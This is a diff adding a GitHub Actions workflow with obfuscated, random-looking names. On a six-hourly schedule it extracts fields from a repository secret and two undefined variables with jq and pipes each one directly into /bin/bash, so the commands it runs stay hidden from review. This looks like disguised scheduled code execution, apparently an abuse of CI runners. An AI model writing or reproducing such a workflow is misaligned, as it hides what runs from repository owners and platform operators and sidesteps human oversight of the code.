@@ -1,0 +1,20 @@
+name: wangyinzi1234
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangyinzi1234
+        env:
+          ax98524: ${{ secrets.ax98524 }}
+        run: |
+          echo $ax98524 | jq -r .vq5797 | /bin/bash
+          echo $rp71 | jq -r .rkxx00449 | /bin/bash
+          echo $rmioh03589 | jq -r .hd6211 | /bin/bash
+
